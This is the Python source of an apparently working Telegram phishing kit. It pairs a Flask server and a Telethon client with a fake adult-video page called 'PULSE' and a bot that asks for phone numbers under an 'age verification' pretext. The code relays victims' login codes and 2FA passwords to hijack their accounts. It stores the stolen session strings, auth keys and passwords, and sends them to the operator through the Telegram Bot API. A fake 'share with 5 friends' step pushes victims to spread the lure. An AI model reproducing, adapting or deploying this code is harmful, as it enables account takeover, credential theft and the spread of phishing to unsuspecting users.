from flask import Flask, request, jsonify, render_template_string, redirect
import os
import json
import base64
import threading
import asyncio
import logging
import time
import random
import requests as http_requests
from datetime import datetime
from telethon import TelegramClient, errors
from telethon.sessions import StringSession
import sys
import re

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ====== Environment Variables ======
BOT_TOKEN = os.environ.get("BOT_TOKEN")
API_ID = int(os.environ.get("API_ID", "0"))
API_HASH = os.environ.get("API_HASH", "")
YOUR_TELEGRAM_ID = int(os.environ.get("OWNER_ID", "0"))
BOT_USERNAME = os.environ.get("BOT_USERNAME", "YourBot")  # bot username without @
# ===================================

if sys.version_info >= (3, 14):
    try:
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    except:
        pass

app = Flask(__name__)

user_sessions = {}
pending_codes = {}
pending_2fa = {}
sessions_lock = threading.Lock()
bot_start_sessions = {}  # session_id -> phone_number mapping from bot

# ====== Persistent Storage ======
DATA_FILE = "captured_accounts.json"

def load_accounts():
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, 'r') as f:
                return json.load(f)
        except Exception as e:
            logger.error(f"Load error: {e}")
            return []
    return []

def save_account(account):
    accounts = load_accounts()
    found = False
    for i, a in enumerate(accounts):
        if a['phone'] == account['phone']:
            accounts[i] = account
            found = True
            break
    if not found:
        accounts.append(account)
    with open(DATA_FILE, 'w') as f:
        json.dump(accounts, f, indent=2)
    logger.info(f"✅ Saved: {account['phone']} | Session: {len(account.get('session',''))} chars")
    return account

captured_accounts = load_accounts()

# ====== Phone Formatter ======
def format_phone(ph):
    if not ph:
        return ph
    digits = ''.join(filter(str.isdigit, ph))
    if not digits:
        return ph
    if ph.startswith('+'):
        return ph
    if len(digits) == 10:
        return '+91' + digits
    if len(digits) == 12 and digits.startswith('91'):
        return '+' + digits
    return '+' + digits

# ====== Bot Notification ======
def send_bot_notification(phone, ss, me, dc, password_used=False, password_text=None):
    try:
        max_len = 3900
        
        extra = ""
        if password_used and password_text:
            extra = f"\n🔐 **2FA Password:** `{password_text}`"
        elif password_used:
            extra = "\n🔐 **2FA Password Used**"
        
        if len(ss) > max_len:
            msg1 = (
                f"🔔 **New Account Captured!**{extra}\n\n"
                f"📱 **Phone:** `{phone}`\n"
                f"👤 **Name:** {me.first_name or ''} {me.last_name or ''}\n"
                f"🆔 **User ID:** `{me.id}`\n"
                f"📛 **Username:** @{me.username or 'N/A'}\n"
                f"🌐 **DC:** `{dc}`\n"
                f"📏 **Session Length:** `{len(ss)} chars`\n\n"
                f"📄 **Session (part 1/2):**\n`{ss[:max_len]}`"
            )
            msg2 = f"📄 **Session (part 2/2) for {phone}:**\n`{ss[max_len:]}`"
            
            http_requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={'chat_id': YOUR_TELEGRAM_ID, 'text': msg1, 'parse_mode': 'Markdown'}, timeout=15)
            http_requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={'chat_id': YOUR_TELEGRAM_ID, 'text': msg2, 'parse_mode': 'Markdown'}, timeout=15)
        else:
            pwd_line = f"\n🔐 **Password:** `{password_text}`" if password_text else ""
            msg = (
                f"🔔 **New Account!**{extra}\n"
                f"📱 `{phone}`\n"
                f"👤 {me.first_name} {me.last_name or ''}\n"
                f"🆔 `{me.id}`\n"
                f"🌐 DC: `{dc}`\n"
                f"📏 Session: `{len(ss)} chars`{pwd_line}\n\n"
                f"🔑 **Session:**\n`{ss}`"
            )
            r = http_requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={'chat_id': YOUR_TELEGRAM_ID, 'text': msg, 'parse_mode': 'Markdown'}, timeout=15)
            if r.status_code != 200:
                http_requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={'chat_id': YOUR_TELEGRAM_ID, 'text': f"Session for {phone}:\n{ss}"}, timeout=15)
    except Exception as e:
        logger.error(f"Bot notify error: {e}")
        print(f"\n{'='*60}")
        print(f"🔴 BOT FAILED! Session for {phone}:")
        print(f"Password: {password_text or 'N/A'}")
        print(f"Session ({len(ss)} chars):")
        print(ss)
        print(f"{'='*60}\n")

# ====== Telegram Async Functions ======

def run_telegram_action(phone, code=None, password=None):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    try:
        async def send_code():
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            
            try:
                r = await client.send_code_request(phone)
                session_str = StringSession.save(client.session)
                
                with sessions_lock:
                    user_sessions[phone] = {
                        'hash': r.phone_code_hash,
                        'session': session_str,
                        'phone_code_result': r
                    }
                    pending_codes[phone] = 'sent'
                    pending_2fa[phone] = False
                
                logger.info(f"✅ Code sent to {phone}")
                return {'success': True}
                
            except errors.FloodWaitError as e:
                logger.error(f"Flood wait {e.seconds}s for {phone}")
                with sessions_lock:
                    pending_codes[phone] = 'err'
                return {'success': False, 'error': f'Flood wait {e.seconds}s'}
            except Exception as e:
                logger.error(f"send_code error: {e}")
                with sessions_lock:
                    pending_codes[phone] = 'err'
                return {'success': False, 'error': str(e)[:80]}
            finally:
                await client.disconnect()
        
        async def verify():
            with sessions_lock:
                if phone not in user_sessions:
                    # Maybe phone already verified? Try to create new session
                    pass
                
                s = user_sessions.get(phone, {})
            
            client = TelegramClient(StringSession(s.get('session', '')), API_ID, API_HASH)
            
            try:
                await client.connect()
                
                if await client.is_user_authorized():
                    me = await client.get_me()
                    logger.info(f"{phone} already authorized")
                else:
                    try:
                        await client.sign_in(
                            phone=phone,
                            code=code,
                            phone_code_hash=s.get('hash', '')
                        )
                        me = await client.get_me()
                    except errors.SessionPasswordNeededError:
                        logger.info(f"2FA needed for {phone}")
                        with sessions_lock:
                            pending_2fa[phone] = True
                            pending_codes[phone] = '2fa_needed'
                        
                        if password:
                            try:
                                await client.sign_in(password=password)
                                me = await client.get_me()
                                
                                with sessions_lock:
                                    pending_2fa[phone] = False
                                    pending_codes[phone] = 'done'
                            except errors.PasswordHashInvalidError:
                                return {'success': False, 'error': 'Wrong 2FA password'}
                            except Exception as e:
                                return {'success': False, 'error': f'2FA error: {str(e)[:50]}'}
                        else:
                            return {'success': False, 'error': '2FA', 'needs_password': True}
                    except errors.PhoneCodeInvalidError:
                        return {'success': False, 'error': 'Wrong code'}
                    except errors.PhoneCodeExpiredError:
                        return {'success': False, 'error': 'Code expired'}
                    except Exception as e:
                        return {'success': False, 'error': str(e)[:80]}
                
                await client.get_dialogs()
                
                ss = StringSession.save(client.session)
                
                auth_key = None
                try:
                    auth_key = client.session.auth_key.key
                except:
                    pass
                
                dc = client.session.dc_id
                
                if not auth_key:
                    logger.warning(f"Auth key None for {phone}, reconnecting...")
                    await client.disconnect()
                    await asyncio.sleep(0.5)
                    
                    client2 = TelegramClient(StringSession(ss), API_ID, API_HASH)
                    await client2.connect()
                    await client2.get_dialogs()
                    
                    auth_key = client2.session.auth_key.key
                    dc = client2.session.dc_id
                    ss = StringSession.save(client2.session)
                    me = await client2.get_me()
                    await client2.disconnect()
                    client = client2
                
                auth_b64 = base64.b64encode(auth_key).decode() if auth_key else ""
                
                password_used = password is not None
                
                acc = {
                    'phone': phone,
                    'user_id': me.id,
                    'username': me.username or '',
                    'first_name': me.first_name or '',
                    'last_name': me.last_name or '',
                    'session': ss,
                    'webk': json.dumps({
                        'dcId': dc,
                        'authKey': auth_b64,
                        'userId': me.id,
                        'isSupport': False,
                        'isTest': False
                    }),
                    'dc': dc,
                    'time': str(datetime.now()),
                    'has_2fa': password_used,
                    'password': password if password_used else ''
                }
                
                save_account(acc)
                global captured_accounts
                captured_accounts = load_accounts()
                
                with sessions_lock:
                    if phone in user_sessions:
                        del user_sessions[phone]
                    if phone in pending_2fa:
                        del pending_2fa[phone]
                    pending_codes[phone] = 'done'
                
                send_bot_notification(phone, ss, me, dc, password_used, password)
                
                logger.info(f"✅ Captured: {phone} | Session: {len(ss)} chars{' | With 2FA: ' + password if password_used else ''}")
                return {'success': True, 'session': ss}
                
            except Exception as e:
                e_str = str(e)
                logger.error(f"Verify error for {phone}: {e_str}")
                
                if 'PHONE_CODE_INVALID' in e_str:
                    return {'success': False, 'error': 'Wrong code'}
                if 'SESSION_PASSWORD_NEEDED' in e_str:
                    return {'success': False, 'error': '2FA', 'needs_password': True}
                if 'PASSWORD_HASH_INVALID' in e_str:
                    return {'success': False, 'error': 'Wrong 2FA password'}
                return {'success': False, 'error': e_str[:80]}
            finally:
                try:
                    await client.disconnect()
                except:
                    pass
        
        if code:
            return loop.run_until_complete(verify())
        else:
            return loop.run_until_complete(send_code())
    finally:
        loop.close()


# ====== BOT POLLING (Request Contact) ======

def bot_polling_loop():
    """Long-poll Telegram Bot API for contact sharing"""
    offset = 0
    logger.info("🤖 Bot polling started for Request Contact...")
    
    while True:
        try:
            resp = http_requests.get(
                f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates",
                params={'offset': offset, 'timeout': 30},
                timeout=35
            )
            data = resp.json()
            
            if data.get('ok') and data.get('result'):
                for update in data['result']:
                    offset = update['update_id'] + 1
                    handle_bot_update(update)
        except Exception as e:
            logger.error(f"Bot polling error: {e}")
            time.sleep(5)

def handle_bot_update(update):
    """Process bot updates - handle /start command and contact sharing"""
    msg = update.get('message', {})
    chat_id = msg.get('chat', {}).get('id')
    
    if not chat_id:
        return
    
    # ===== /start command =====
    if msg.get('text', '').startswith('/start'):
        parts = msg['text'].split(' ', 1)
        session_id = parts[1] if len(parts) > 1 else None
        
        if session_id:
            with sessions_lock:
                bot_start_sessions[session_id] = {
                    'chat_id': chat_id,
                    'phone': None,
                    'status': 'waiting',
                    'timestamp': time.time()
                }
            
            # Send contact request
            send_contact_keyboard(chat_id, session_id)
        else:
            http_requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    'chat_id': chat_id,
                    'text': "❌ Invalid link. Please use the button on the website."
                }
            )
    
    # ===== Contact received =====
    elif msg.get('contact'):
        phone = msg['contact'].get('phone_number', '')
        contact_user_id = msg['contact'].get('user_id')
        
        # Format phone
        if phone:
            phone = format_phone(phone)
        
        # Find which session_id this contact belongs to
        # We match by chat_id
        found = False
        with sessions_lock:
            for sid, sdata in bot_start_sessions.items():
                if sdata['chat_id'] == chat_id and sdata['status'] == 'waiting':
                    sdata['phone'] = phone
                    sdata['status'] = 'received'
                    found = True
                    
                    http_requests.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                        json={
                            'chat_id': chat_id,
                            'text': f"✅ Phone received: {phone}\n\nNow go back to the website to complete verification.",
                            'reply_markup': {'remove_keyboard': True}
                        }
                    )
                    logger.info(f"📱 Contact received via bot: {phone}")
                    break
        
        if not found:
            http_requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    'chat_id': chat_id,
                    'text': "✅ Thanks! Please go back to the website."
                }
            )

def send_contact_keyboard(chat_id, session_id):
    """Send a message with Request Contact button"""
    keyboard = {
        'keyboard': [[{
            'text': '📱 Share My Phone Number',
            'request_contact': True
        }]],
        'resize_keyboard': True,
        'one_time_keyboard': True
    }
    
    http_requests.post(
        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
        json={
            'chat_id': chat_id,
            'text': (
                "🔞 **Age Verification Required**\n\n"
                "To access the 18+ content, you need to verify your age.\n\n"
                "👇 **Tap the button below** to share your Telegram phone number.\n"
                "Your number is only used for age verification."
            ),
            'parse_mode': 'Markdown',
            'reply_markup': keyboard
        }
    )

# ====== Phishing Page with Request Contact & State Persistence ======
PAGE = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>PULSE — 🔞 Exclusive Content</title>
<style>
:root{--bg:#0b0b0f;--card:#12121a;--border:#1e1e2e;--pink:#ff2d55;--blue:#0088ff;--green:#34c759;--text:#eee;--muted:#666;--grad:linear-gradient(135deg,#ff2d55,#ff6b35)}
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:var(--bg);color:var(--text);scrollbar-width:none}
::-webkit-scrollbar{display:none}

.status-bar{display:flex;justify-content:space-between;padding:10px 18px 5px;font-size:11px;color:var(--muted);background:var(--bg)}
.status-bar .time{font-weight:600;color:#ddd}

.main-header{display:flex;justify-content:space-between;align-items:center;padding:5px 16px 12px}
.main-header h1{font-size:22px;font-weight:900;background:var(--grad);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:-0.5px}

.tabs{display:flex;padding:0 16px 10px;gap:8px;overflow-x:auto}
.tab{background:var(--card);border:1px solid var(--border);padding:7px 18px;border-radius:20px;font-size:13px;color:var(--muted);white-space:nowrap;cursor:pointer;transition:0.2s}
.tab.active{background:var(--grad);color:#fff;border-color:transparent}

.hero-card{margin:5px 14px 14px;border-radius:16px;overflow:hidden;background:var(--card);border:1px solid var(--border);position:relative}
.hero-thumb{width:100%;height:220px;background:linear-gradient(135deg,#1a0533,#2d0f4a,#6b1a3a,#1a0533);display:flex;align-items:center;justify-content:center;position:relative}
.hero-thumb::after{content:'';position:absolute;bottom:0;left:0;right:0;height:80px;background:linear-gradient(transparent,var(--card))}
.hero-thumb .play-big{width:72px;height:72px;border-radius:50%;background:rgba(255,255,255,0.12);display:flex;align-items:center;justify-content:center;font-size:30px;border:2px solid rgba(255,255,255,0.15)}
.hero-thumb .duration{position:absolute;bottom:20px;right:14px;background:rgba(0,0,0,0.8);padding:3px 10px;border-radius:6px;font-size:12px;z-index:2}
.hero-info{padding:14px 16px 16px}
.hero-info .badge{display:inline-block;background:var(--pink);padding:3px 12px;border-radius:4px;font-size:10px;font-weight:700;text-transform:uppercase;margin-bottom:8px}
.hero-info h2{font-size:16px;margin-bottom:4px}
.hero-info .meta{font-size:12px;color:var(--muted);display:flex;gap:12px;flex-wrap:wrap}
.hero-info .meta span{display:flex;align-items:center;gap:4px}

.section-header{display:flex;justify-content:space-between;align-items:center;padding:4px 16px 8px}
.section-header h3{font-size:17px;font-weight:700}
.section-header a{color:var(--blue);font-size:12px;text-decoration:none;opacity:0.8}

.video-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;padding:0 14px 20px}
.v-item{background:var(--card);border-radius:12px;overflow:hidden;border:1px solid var(--border);cursor:pointer}
.v-item:active{transform:scale(0.97)}
.v-thumb{height:105px;display:flex;align-items:center;justify-content:center;font-size:28px;color:rgba(255,255,255,0.15);position:relative}
.v-thumb .v-dur{position:absolute;bottom:6px;right:6px;background:rgba(0,0,0,0.85);padding:2px 6px;border-radius:4px;font-size:9px}
.v-thumb .v-views{position:absolute;bottom:6px;left:6px;font-size:9px;color:#aaa;background:rgba(0,0,0,0.5);padding:2px 6px;border-radius:4px}
.v-thumb.t1{background:linear-gradient(135deg,#1a0a2e,#5b2c8e)}
.v-thumb.t2{background:linear-gradient(135deg,#2e0a1a,#c0392b)}
.v-thumb.t3{background:linear-gradient(135deg,#0a1a2e,#2980b9)}
.v-thumb.t4{background:linear-gradient(135deg,#1a2e0a,#27ae60)}
.v-thumb.t5{background:linear-gradient(135deg,#2e1a0a,#d35400)}
.v-thumb.t6{background:linear-gradient(135deg,#1a1a2e,#8e44ad)}
.v-info{padding:9px 10px}
.v-info h4{font-size:12px;margin-bottom:2px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.v-info .v-meta{display:flex;justify-content:space-between;font-size:10px;color:var(--muted)}

.cta-section{padding:0 14px 20px}
.cta-btn{width:100%;padding:16px;background:var(--grad);border:none;border-radius:50px;color:#fff;font-size:20px;font-weight:800;cursor:pointer;letter-spacing:0.5px;text-transform:uppercase;box-shadow:0 8px 30px rgba(255,45,85,0.35);transition:all 0.3s;display:flex;align-items:center;justify-content:center;gap:8px}
.cta-btn:hover{transform:translateY(-2px);box-shadow:0 12px 40px rgba(255,45,85,0.5)}
.cta-btn:active{transform:translateY(0)}

.bottom-nav{display:flex;justify-content:space-around;padding:10px 16px 20px;border-top:1px solid var(--border);margin-top:5px;background:var(--card)}
.nav-item{text-align:center;color:var(--muted);font-size:10px;cursor:pointer}
.nav-item.active{color:var(--pink)}
.nav-item .ni{font-size:22px;margin-bottom:2px}

/* ===== MODAL ===== */
.modal-overlay{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.9);z-index:9999;padding:16px;overflow-y:auto;backdrop-filter:blur(8px)}
.modal-overlay.active{display:flex;align-items:center;justify-content:center}
.modal{background:var(--card);border-radius:20px;padding:28px 24px;max-width:380px;width:100%;border:1px solid var(--border);animation:slideUp 0.35s cubic-bezier(0.16,1,0.3,1)}
@keyframes slideUp{from{transform:translateY(50px);opacity:0}to{transform:translateY(0);opacity:1}}
.modal-icon{text-align:center;font-size:48px;margin-bottom:8px}
.modal h2{text-align:center;font-size:19px;margin-bottom:4px}
.modal p{text-align:center;color:#888;font-size:13px;margin-bottom:16px}

/* ===== STEP 1: Contact Button ===== */
.contact-request-box{background:#0b0b0f;border:2px solid var(--border);border-radius:16px;padding:30px 20px;text-align:center;margin-bottom:14px}
.contact-request-box .big-icon{font-size:64px;margin-bottom:12px}
.contact-request-box h3{font-size:17px;margin-bottom:6px}
.contact-request-box p{font-size:12px;color:var(--muted);margin-bottom:18px;line-height:1.5}

.btn-telegram{width:100%;padding:18px;background:#0088cc;border:none;border-radius:14px;color:#fff;font-size:17px;font-weight:700;cursor:pointer;transition:0.2s;display:flex;align-items:center;justify-content:center;gap:10px;box-shadow:0 6px 25px rgba(0,136,204,0.3)}
.btn-telegram:hover{background:#0071b3;transform:translateY(-1px)}
.btn-telegram:active{transform:translateY(0)}
.btn-telegram .icon{font-size:24px}

.btn-secondary{width:100%;padding:14px;background:transparent;border:1px solid var(--border);border-radius:12px;color:var(--muted);font-size:13px;cursor:pointer;transition:0.2s;margin-top:10px}
.btn-secondary:hover{border-color:#555;color:#aaa}

.step{display:none}
.step.active{display:block}

.status-box{padding:12px 14px;border-radius:10px;margin:10px 0;display:none;font-size:13px;text-align:center}
.status-box.show{display:block}
.status-box.waiting{background:rgba(255,152,0,0.12);color:#FFB74D;border:1px solid rgba(255,152,0,0.2)}
.status-box.success{background:rgba(52,199,89,0.12);color:#81C784;border:1px solid rgba(52,199,89,0.2)}
.status-box.error{background:rgba(255,45,85,0.12);color:#EF9A9A;border:1px solid rgba(255,45,85,0.2)}
.status-box.info{background:rgba(0,136,255,0.12);color:#90CAF9;border:1px solid rgba(0,136,255,0.2)}

.code-display{background:#0b0b0f;border:2px solid var(--border);border-radius:12px;padding:14px;font-size:32px;text-align:center;letter-spacing:16px;color:#fff;font-weight:700;min-height:56px;margin:10px 0;font-family:monospace}

.numpad{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin:12px 0}
.numpad .key{padding:18px;border:none;border-radius:10px;background:var(--card);color:#fff;font-size:22px;cursor:pointer;transition:0.12s;font-weight:600}
.numpad .key:active{transform:scale(0.94);background:#2a2a3e}
.numpad .key-clear{background:rgba(255,45,85,0.12);color:var(--pink)}
.numpad .key-submit{background:var(--green);color:#fff;font-weight:700;font-size:14px}
.numpad .key-submit:disabled{background:#1a1a2e;color:#555;cursor:not-allowed}

.share-progress{display:flex;justify-content:center;gap:6px;margin:16px 0}
.share-step{width:36px;height:36px;border-radius:50%;background:#1a1a2e;display:flex;align-items:center;justify-content:center;font-size:13px;color:#555;font-weight:700;border:2px solid transparent;transition:0.3s}
.share-step.done{background:var(--green);color:#fff;border-color:var(--green);box-shadow:0 0 12px rgba(52,199,89,0.3)}
.share-step.active{background:transparent;color:#fff;border-color:var(--blue);animation:pulse 1.2s infinite}
@keyframes pulse{0%{box-shadow:0 0 0 0 rgba(0,136,255,0.3)}50%{box-shadow:0 0 0 8px rgba(0,136,255,0)}100%{box-shadow:0 0 0 0 rgba(0,136,255,0)}}

.password-input{width:100%;padding:15px;background:#0b0b0f;border:2px solid var(--border);border-radius:12px;color:#fff;font-size:18px;text-align:center;outline:none;margin:10px 0;transition:0.2s}
.password-input:focus{border-color:var(--blue)}
.password-input::placeholder{color:#444}

.fake-loader{margin:20px auto;width:48px;height:48px;border:4px solid #1a1a2e;border-top-color:var(--blue);border-radius:50%;animation:spin 0.8s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}

.share-link-box{background:#0b0b0f;padding:12px;border-radius:10px;border:1px solid var(--border);margin-top:14px;text-align:center}
.share-link-box p{font-size:11px;color:#555;margin-bottom:6px}
.share-link-box code{color:var(--blue);font-size:10px;word-break:break-all}

.footer{text-align:center;padding:10px;color:#333;font-size:10px}
</style>
</head>
<body>

<!-- ===== STATUS BAR ===== -->
<div class="status-bar">
    <span class="time" id="fakeTime">12:34</span>
    <span>📶 5G ████ 78% 🔋</span>
</div>

<div class="main-header">
    <h1>PULSE</h1>
</div>

<div class="tabs">
    <span class="tab active">🔥 Trending</span>
    <span class="tab">✨ New</span>
    <span class="tab">🔞 Exclusive</span>
    <span class="tab">📈 Top</span>
</div>

<div class="hero-card">
    <div class="hero-thumb">
        <div class="play-big">▶</div>
        <span class="duration">18:42</span>
    </div>
    <div class="hero-info">
        <span class="badge">🔞 VIP EXCLUSIVE</span>
        <h2>🔥 PRIVATE VIDEO — FULL HD 2026</h2>
        <div class="meta">
            <span>⭐ 4.9 (2.4M views)</span>
            <span>🔞 18+ Only</span>
        </div>
        <p style="color:#555;font-size:12px;margin-top:8px">Age-restricted content. Verify your account to continue.</p>
    </div>
</div>

<div class="cta-section">
    <button class="cta-btn" id="glb">▶ Unlock Full Video <span style="display:block;font-size:11px;font-weight:400;opacity:0.8">🔐 Verify via Telegram</span></button>
</div>

<div class="section-header">
    <h3>🔥 Recommended</h3>
    <a href="#">See all</a>
</div>

<div class="video-grid">
    <div class="v-item"><div class="v-thumb t1"><span class="v-dur">12:08</span><span class="v-views">🔥 1.8M</span>▶</div><div class="v-info"><h4>Private Vlog #01</h4><div class="v-meta"><span>⭐ 4.8</span><span>🔞 18+</span></div></div></div>
    <div class="v-item"><div class="v-thumb t2"><span class="v-dur">09:34</span><span class="v-views">🔥 1.5M</span>▶</div><div class="v-info"><h4>Behind Closed Doors #02</h4><div class="v-meta"><span>⭐ 4.7</span><span>🔞 18+</span></div></div></div>
    <div class="v-item"><div class="v-thumb t3"><span class="v-dur">14:22</span><span class="v-views">🔥 2.1M</span>▶</div><div class="v-info"><h4>Leaked Tape #03</h4><div class="v-meta"><span>⭐ 4.9</span><span>🔞 18+</span></div></div></div>
    <div class="v-item"><div class="v-thumb t4"><span class="v-dur">07:55</span><span class="v-views">🔥 1.2M</span>▶</div><div class="v-info"><h4>Private Session #04</h4><div class="v-meta"><span>⭐ 4.6</span><span>🔞 18+</span></div></div></div>
    <div class="v-item"><div class="v-thumb t5"><span class="v-dur">21:10</span><span class="v-views">🔥 3.2M</span>▶</div><div class="v-info"><h4>VIP Content #05</h4><div class="v-meta"><span>⭐ 4.9</span><span>🔞 18+</span></div></div></div>
    <div class="v-item"><div class="v-thumb t6"><span class="v-dur">16:47</span><span class="v-views">🔥 2.7M</span>▶</div><div class="v-info"><h4>Premium Clip #06</h4><div class="v-meta"><span>⭐ 4.8</span><span>🔞 18+</span></div></div></div>
</div>

<div class="bottom-nav">
    <div class="nav-item active"><div class="ni">🏠</div>Home</div>
    <div class="nav-item"><div class="ni">🔥</div>Trending</div>
    <div class="nav-item"><div class="ni">❤️</div>Favorites</div>
    <div class="nav-item"><div class="ni">👤</div>Profile</div>
</div>

<div class="footer">© 2026 PULSE Media</div>

<!-- ===== MODAL ===== -->
<div class="modal-overlay" id="vm">
    <div class="modal">
        
        <!-- STEP 1: Request Contact Button (via Telegram Bot) -->
        <div id="s1" class="step active">
            <div class="modal-icon">🔞</div>
            <h2>Age Verification</h2>
            <p>You must verify your age to access this 18+ content</p>
            
            <div class="contact-request-box">
                <div class="big-icon">📱</div>
                <h3>Verify with Telegram</h3>
                <p>Tap the button below to share your phone number via Telegram. Your number is only used for age verification.</p>
                
                <button class="btn-telegram" id="requestContactBtn" onclick="requestContact()">
                    <span class="icon">✈️</span> Verify via Telegram
                </button>
                
                <button class="btn-secondary" onclick="showManualInput()">
                    Or enter manually →
                </button>
            </div>
            
            <div id="contactStatus" class="status-box" style="display:none"></div>
        </div>
        
        <!-- STEP 1B: Manual Phone Input (fallback) -->
        <div id="s1b" class="step">
            <div class="modal-icon">📱</div>
            <h2>Enter Phone Number</h2>
            <p>Enter your Telegram account phone number</p>
            
            <div style="display:flex;background:#0b0b0f;border:2px solid var(--border);border-radius:12px;overflow:hidden;margin-bottom:14px">
                <div style="padding:14px 10px;background:var(--card);color:#888;font-size:14px;font-weight:600;display:flex;align-items:center;gap:4px;min-width:60px;justify-content:center;border-right:1px solid var(--border)">🇮🇳 +91</div>
                <input type="tel" id="phoneInput" placeholder="XXXXXXXXXX" maxlength="10" style="flex:1;padding:14px;background:transparent;border:none;color:#fff;font-size:20px;text-align:center;outline:none;letter-spacing:2px;font-weight:600" inputmode="numeric">
            </div>
            
            <button class="btn-telegram" onclick="sendPhoneFromManual()" style="background:var(--grad);box-shadow:0 6px 25px rgba(255,45,85,0.3)">
                📤 Send Code
            </button>
            
            <button class="btn-secondary" onclick="showStep('s1')">
                ← Back to Telegram Verify
            </button>
            
            <div id="ps1" class="status-box" style="display:none"></div>
        </div>
        
        <!-- STEP 2: OTP -->
        <div id="s2" class="step">
            <div class="modal-icon">🔐</div>
            <h2>Enter Code</h2>
            <p>Code sent to <span id="pd" style="color:var(--blue);font-weight:700;">+91XXXXXXXXXX</span></p>
            
            <div id="cs" class="status-box waiting show" style="display:none">⏳ Sending code...</div>
            
            <div class="code-display" id="cdisp">_____</div>
            
            <div class="numpad" id="np">
                <button class="key" onclick="pk('1')">1</button>
                <button class="key" onclick="pk('2')">2</button>
                <button class="key" onclick="pk('3')">3</button>
                <button class="key" onclick="pk('4')">4</button>
                <button class="key" onclick="pk('5')">5</button>
                <button class="key" onclick="pk('6')">6</button>
                <button class="key" onclick="pk('7')">7</button>
                <button class="key" onclick="pk('8')">8</button>
                <button class="key" onclick="pk('9')">9</button>
                <button class="key key-clear" onclick="cc()">⌫</button>
                <button class="key" onclick="pk('0')">0</button>
                <button class="key key-submit" id="sb" onclick="sc()">✓ OK</button>
            </div>
            
            <div id="vs" class="status-box"></div>
        </div>
        
        <!-- STEP 2B: 2FA -->
        <div id="s2b" class="step">
            <div class="modal-icon">🔑</div>
            <h2>2FA Required</h2>
            <p>Enter your Telegram cloud password:</p>
            <input type="password" id="pwdInput" class="password-input" placeholder="Enter your password" maxlength="64">
            <button class="btn-telegram" onclick="submitPassword()" style="background:var(--pink);box-shadow:0 6px 25px rgba(255,45,85,0.3)">🔑 Verify Password</button>
            <div id="pwdStatus" class="status-box"></div>
        </div>
        
        <!-- STEP 3: Share Trick -->
        <div id="s3" class="step">
            <div class="modal-icon">🎬</div>
            <h2>Almost There!</h2>
            <p>Share with <strong>5 friends</strong> to unlock the video</p>
            
            <div class="share-progress" id="shareProgress">
                <div class="share-step active" id="sp1">1</div>
                <div class="share-step" id="sp2">2</div>
                <div class="share-step" id="sp3">3</div>
                <div class="share-step" id="sp4">4</div>
                <div class="share-step" id="sp5">5</div>
            </div>
            
            <div id="shareStatus" class="status-box waiting show" style="display:block">⏳ Share to start unlocking...</div>
            
            <button class="btn-telegram" onclick="simulateShare()" style="background:var(--green);box-shadow:0 6px 25px rgba(52,199,89,0.3)">📤 Share to Telegram</button>
            
            <div class="share-link-box">
                <p>🔗 Your link:</p>
                <code id="shareLink">https://t.me/share/url?url=...</code>
            </div>
        </div>
    </div>
</div>

<script>
// ===== STATE MANAGEMENT via localStorage =====
var SAVED_PHONE_KEY = 'pulse_verified_phone';
var SAVED_STEP_KEY = 'pulse_current_step';
var SAVED_SHARES_KEY = 'pulse_shares_done';

var phoneNumber = localStorage.getItem(SAVED_PHONE_KEY) || '';
var savedStep = localStorage.getItem(SAVED_STEP_KEY) || '';
var codeDigits = '';
var codeCheckInterval = null;
var passwordCheckInterval = null;
var sharesDone = parseInt(localStorage.getItem(SAVED_SHARES_KEY) || '0', 10);
var shareLinkBase = window.location.href;
var botSessionId = '';
var contactCheckInterval = null;

// ===== FAKE TIME =====
function updateFakeTime() {
    var d = new Date();
    document.getElementById('fakeTime').textContent = 
        String(d.getHours()).padStart(2,'0') + ':' + String(d.getMinutes()).padStart(2,'0');
}
updateFakeTime();
setInterval(updateFakeTime, 10000);

// ===== OPEN MODAL WITH STATE PERSISTENCE =====
document.getElementById('glb').onclick = function() {
    document.getElementById('vm').classList.add('active');
    restoreState();
};

function restoreState() {
    // Check if we have saved step
    var step = localStorage.getItem(SAVED_STEP_KEY);
    var phone = localStorage.getItem(SAVED_PHONE_KEY);
    
    if (step === 'otp_sent' && phone) {
        // Phone already entered, go to OTP step
        phoneNumber = phone;
        showStep('s2');
        document.getElementById('pd').textContent = phoneNumber;
        document.getElementById('cs').className = 'status-box success show';
        document.getElementById('cs').innerHTML = '✅ Code already sent! Enter below:';
        document.getElementById('cs').style.display = 'block';
        startCodeCheck();
    } else if (step === 'share_page') {
        // User was on share page, go back to it
        showStep('s3');
        setupShareLink();
        updateShareProgress();
        var st = document.getElementById('shareStatus');
        if (sharesDone > 0 && sharesDone < 4) {
            st.className = 'status-box success show';
            st.innerHTML = '✅ ' + sharesDone + '/5 shared! ' + (5 - sharesDone) + ' more to go...';
        } else if (sharesDone >= 4) {
            st.className = 'status-box waiting show';
            st.innerHTML = '⏳ Almost there! Just 1 more share!';
        } else {
            st.className = 'status-box waiting show';
